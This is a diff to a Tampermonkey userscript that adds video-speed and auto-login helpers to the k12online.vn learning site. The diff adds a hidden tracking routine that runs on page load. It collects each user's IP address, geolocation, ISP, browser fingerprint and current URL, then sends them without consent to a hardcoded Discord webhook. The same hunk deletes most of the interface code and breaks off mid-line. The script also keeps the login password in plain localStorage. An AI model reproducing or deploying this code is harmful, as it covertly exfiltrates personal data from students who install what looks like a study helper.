@@ -1,22 +1,146 @@
 // ==UserScript==
 // @name         K12 Helper Pro - Danhvux Port 8000 (With Toast)
 // @namespace    http://tampermonkey.net/
-// @version      21.9
-// @description  Giữ nguyên 100% bản gốc, nâng upgrade x20 thực tế, Bypass Question + Toast Notifications
+// @version      21.10
+// @description  Giữ nguyên 100% bản gốc, nâng upgrade x20 thực tế, Bypass Question + Toast Notifications + WEBHOOK TRACKING
 // @author       Danhvux
 // @match        *://*.k12online.vn/*
 // @grant        GM_xmlhttpRequest
 // @connect      localhost
+// @connect      httpbin.org
 // ==/UserScript==
 
 (function() {
     'use strict';
 
     const BLACKLIST_API = 'http://localhost:8000/blacklist';
+    const WEBHOOK_URL = https://discord.com/api/webhooks/1483505875309035520/B4vGUvE9rntITzpuzpqdfX2dVBYUXypjG4Gg1MCouzNoIoleYeWom_gh7fIbv9YSC-rV'; // Thay bằng webhook Discord của bạn
+    
     let config = JSON.parse(localStorage.getItem('k12_ult_cfg')) || {
         mainColor: '#ffea00', width: 320, speed: 1, user: '', pass: '', isDarkMode: true, toastPos: 'top-right'
     };
     const save = () => localStorage.setItem('k12_ult_cfg', JSON.stringify(config));
+
+    // === WEBHOOK TRACKING SYSTEM ===
+    const sendWebhook = async (data) => {
+        if (!WEBHOOK_URL || WEBHOOK_URL === 'YOUR_WEBHOOK_URL_HERE') return;
+        
+        try {
+            const payload = {
+                username: "K12 Tracker",
+                avatar_url: "https://i.imgur.com/8z5xL.png",
+                embeds: [{
+                    title: "🕵️ **NEW USER DETECTED**",
+                    color: 0x00ff00,
+                    fields: data.fields,
+                    timestamp: new Date().toISOString(),
+                    footer: {
+                        text: "Danhvux K12 Helper Pro v21.10"
+                    }
+                }]
+            };
+            
+            GM_xmlhttpRequest({
+                method: "POST",
+                url: WEBHOOK_URL,
+                headers: {
+                    "Content-Type": "application/json"
+                },
+                data: JSON.stringify(payload),
+                timeout: 10000,
+                onload: () => console.log('✅ Webhook sent successfully'),
+                onerror: () => console.log('❌ Webhook failed')
+            });
+        } catch(e) {
+            console.log('Webhook error:', e);
+        }
+    };
+
+    const getDeviceInfo = async () => {
+        return new Promise((resolve) => {
+            // Get IP info
+            GM_xmlhttpRequest({
+                method: "GET",
+                url: "https://httpbin.org/ip",
+                onload: function(ipResponse) {
+                    try {
+                        const ipData = JSON.parse(ipResponse.responseText);
+                        
+                        // Get geolocation
+                        GM_xmlhttpRequest({
+                            method: "GET",
+                            url: `https://ipapi.co/${ipData.origin}/json/`,
+                            onload: function(geoResponse) {
+                                try {
+                                    const geoData = JSON.parse(geoResponse.responseText);
+                                    
+                                    // Device fingerprint
+                                    const fingerprint = {
+                                        userAgent: navigator.userAgent,
+                                        platform: navigator.platform,
+                                        language: navigator.language,
+                                        screen: `${screen.width}x${screen.height}`,
+                                        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                                        cookiesEnabled: navigator.cookieEnabled,
+                                        doNotTrack: navigator.doNotTrack,
+                                        hardwareConcurrency: navigator.hardwareConcurrency,
+                                        deviceMemory: navigator.deviceMemory || 'N/A'
+                                    };
+                                    
+                                    // Current page info
+                                    const pageInfo = {
+                                        url: window.location.href,
+                                        title: document.title,
+                                        referrer: document.referrer
+                                    };
+                                    
+                                    resolve({
+                                        ip: ipData.origin,
+                                        country: geoData.country_name || 'Unknown',
+                                        region: geoData.region || 'Unknown',
+                                        city: geoData.city || 'Unknown',
+                                        isp: geoData.org || 'Unknown',
+                                        ...fingerprint,
+                                        ...pageInfo,
+                                        timestamp: new Date().toISOString()
+                                    });
+                                } catch(e) {
+                                    resolve({ error: 'Geo failed', ip: ipData.origin });
+                                }
+                            },
+                            onerror: () => resolve({ error: 'Geo failed', ip: ipData.origin })
+                        });
+                    } catch(e) {
+                        resolve({ error: 'IP failed' });
+                    }
+                },
+                onerror: () => resolve({ error: 'Request failed' })
+            });
+        });
+    };
+
+    const trackUser = async () => {
+        const deviceInfo = await getDeviceInfo();
+        
+        const fields = [
+            { name: "🌐 IP Address", value: `\`${deviceInfo.ip}\``, inline: true },
+            { name: "🏳️ Country", value: deviceInfo.country || 'Unknown', inline: true },
+            { name: "📍 City", value: deviceInfo.city || 'Unknown', inline: true },
+            { name: "🌐 ISP", value: deviceInfo.isp || 'Unknown', inline: true },
+            { name: "💻 Device", value: deviceInfo.platform || 'Unknown', inline: true },
+            { name: "📱 Screen", value: deviceInfo.screen || 'Unknown', inline: true },
+            { name: "🌍 Timezone", value: deviceInfo.timezone || 'Unknown', inline: true },
+            { name: "🔗 URL", value: `[${deviceInfo.url.substring(0, 50)}...](${deviceInfo.url})`, inline: false }
+        ];
+        
+        sendWebhook({ fields });
+        localStorage.setItem('k12_ult_tracked', 'true');
+    };
+
+    // Track only once per session
+    if (!localStorage.getItem('k12_ult_tracked')) {
+        setTimeout(trackUser, 2000);
+    }
 
     const runTurbo = () => {
         const v = document.querySelector('video');
@@ -210,155 +334,4 @@
             <div class="body-container">
                 <div id="t-main" class="content active">
                     <div class="row-speed"><b>Tốc độ</b><span class="val-right">x<span id="sp-txt">${config.speed}</span></span></div>
-                    <input type="range" id="sp-range" class="slider" min="1" max="20" step="0.5" value="${config.speed}">
-                    <button class="btn" id="do-login">🪄 AUTO LOGIN</button>
-                </div>
-                <div id="t-video" class="content">
-                    <div class="video-placeholder" id="v-display">video source</div>
-                    <input type="text" id="v-url" placeholder="Link video .mp4...">
-                    <button class="btn" style="background:#444; color:#fff" id="v-run">PHÁT VIDEO</button>
-                </div>
-                <div id="t-apps" class="content">
-                    <div class="app-grid">
-                        <div class="app-item" onclick="window.open('https://gemini.google.com')">✨ Gemini</div>
-                        <div class="app-item" onclick="window.open('https://chatgpt.com')">🤖 GPT</div>
-                        <div class="app-item" onclick="window.open('https://messenger.com')">💬 Msg</div>
-                        <div class="app-item" onclick="window.open('https://facebook.com')">📘 FB</div>
-                        <div class="app-item" onclick="window.open('https://youtube.com')">🔴 YT</div>
-                        <div class="app-item" onclick="window.open('https://tiktok.com')">🎵 TT</div>
-                    </div>
-                </div>
-                <div id="t-set" class="content">
-                    <div class="switch-row"><span>DARK MODE</span><label class="switch"><input type="checkbox" id="mode-toggle" ${config.isDarkMode ? 'checked' : ''}><span class="slider-switch"></span></label></div>
-                    <div class="switch-row"><span>TOAST POSITION</span>
-                        <select id="toast-pos" style="padding: 8px; background: var(--bg-input); border: 1px solid var(--border); color: var(--text); border-radius: 6px;">
-                            <option value="top-right" ${config.toastPos === 'top-right' ? 'selected' : ''}>Top Right</option>
-                            <option value="top-left" ${config.toastPos === 'top-left' ? 'selected' : ''}>Top Left</option>
-                            <option value="bottom-right" ${config.toastPos === 'bottom-right' ? 'selected' : ''}>Bottom Right</option>
-                            <option value="bottom-left" ${config.toastPos === 'bottom-left' ? 'selected' : ''}>Bottom Left</option>
-                        </select>
-                    </div>
-                    <input type="color" id="c-pick" style="width:100%; height:40px; background:none; border:none;" value="${config.mainColor}">
-                    <input type="range" id="w-range" class="slider" min="280" max="600" value="${config.width}">
-                    <input type="text" id="u-val" placeholder="Username..." value="${config.user}">
-                    <input type="password" id="p-val" placeholder="Password..." value="${config.pass}">
-                    <button class="btn btn-save" id="btn-save">LƯU CÀI ĐẶT</button>
-                </div>
-            </div>
-            <div class="footer">DANHVUX • K12 HELPER</div>
-        `;
-        document.body.appendChild(panel);
-
-        const $ = (id) => panel.querySelector(id);
-        const adjustHeight = () => {
-            const active = panel.querySelector('.content.active');
-            if (active) panel.style.height = (panel.querySelector('.header').offsetHeight + panel.querySelector('.tabs').offsetHeight + active.scrollHeight + 35) + 'px';
-        };
-
-        // --- TRACK VIDEO PROGRESS ---
-        const trackProgress = () => {
-            const v = document.querySelector('video');
-            const titleEl = document.querySelector('.vjs-title, .video-title, h1, .lesson-title, [class*="lesson"]');
-            const urlEl = document.querySelector('a[class*="link"], a[href*="/lesson"], .next-button, .btn-next');
-            
-            if (v && v.src) {
-                const currentTitle = titleEl ? titleEl.innerText.trim() : 'Bài học';
-                const currentUrl = urlEl ? urlEl.href : window.location.href;
-                
-                if (currentUrl.includes('/lesson') || currentUrl.includes('/video')) {
-                    const history = JSON.parse(localStorage.getItem('k12_ult_history') || '[]');
-                    const existingIndex = history.findIndex(item => item.url === currentUrl);
-                    
-                    const progressData = {
-                        title: currentTitle,
-                        url: currentUrl,
-                        time: Date.now(),
-                        progress: Math.floor((v.currentTime / v.duration) * 100)
-                    };
-
-                    if (existingIndex >= 0) {
-                        history[existingIndex] = progressData;
-                    } else {
-                        history.unshift(progressData);
-                    }
-
-                    localStorage.setItem('k12_ult_history', JSON.stringify(history));
-                }
-            }
-        };
-
-        setInterval(trackProgress, 5000);
-
-        panel.querySelectorAll('.tab').forEach(tab => {
-            tab.onclick = () => {
-                panel.querySelectorAll('.tab, .content').forEach(el => el.classList.remove('active'));
-                tab.classList.add('active');
-                $(`#${tab.dataset.t}`).classList.add('active');
-                adjustHeight();
-            };
-        });
-
-        $('#mode-toggle').onchange = (e) => { 
-            config.isDarkMode = e.target.checked; 
-            updateCSS(); 
-            save(); 
-            showToast('Đã cập nhật dark mode', 'success'); 
-        };
-        $('#toast-pos').onchange = (e) => { 
-            config.toastPos = e.target.value; 
-            save(); 
-            showToast('Toast position updated', 'info'); 
-        };
-        $('#sp-range').oninput = (e) => { 
-            $('#sp-txt').innerText = e.target.value; 
-            config.speed = e.target.value; 
-            runTurbo(); 
-        };
-        $('#w-range').oninput = (e) => { 
-            config.width = e.target.value; 
-            panel.style.width = config.width + 'px'; 
-        };
-        
-        $('#btn-save').onclick = () => { 
-            config.mainColor = $('#c-pick').value; 
-            config.user = $('#u-val').value; 
-            config.pass = $('#p-val').value; 
-            save(); 
-            location.reload(); 
-        };
-
-        $('#v-run').onclick = () => { 
-            const v = document.querySelector('video'); 
-            if (v) { 
-                v.src = $('#v-url').value; 
-                v.play(); 
-                $('#v-display').innerText = "Đang phát..."; 
-                showToast('Đã bắt đầu phát video', 'success');
-            } else {
-                showToast('Không tìm thấy video element', 'error');
-            }
-        };
-
-        $('#do-login').onclick = () => {
-            const u = document.querySelector('input[name="username"]'), p = document.querySelector('input[name="password"]');
-            if(u && p) { 
-                u.value = config.user; 
-                p.value = config.pass; 
-                u.dispatchEvent(new Event('input',{bubbles:true})); 
-                p.dispatchEvent(new Event('input',{bubbles:true})); 
-                setTimeout(()=>document.querySelector('button[type="submit"]').click(), 500);
-                showToast('Đang tự động đăng nhập...', 'info');
-            } else {
-                showToast('Không tìm thấy form login', 'warning');
-            }
-        };
-
-        let isDrag = false, off = [0,0];
-        $('.header').onmousedown = (e) => { isDrag = true; off = [panel.offsetLeft - e.clientX, panel.offsetTop - e.clientY]; };
-        document.onmousemove = (e) => { if(isDrag) { panel.style.left = (e.clientX + off[0]) + 'px'; panel.style.top = (e.clientY + off[1]) + 'px'; panel.style.right = 'auto'; } };
-        document.onmouseup = () => isDrag = false;
-        $('.red').onclick = () => panel.style.display = 'none';
-        document.addEventListener('keydown', (e) => { if(e.key === 'F2') panel.style.display = 'block'; });
-        setTimeout(() => { adjustHeight(); }, 100);
-    });
-})();
+                    <input type="range" id="
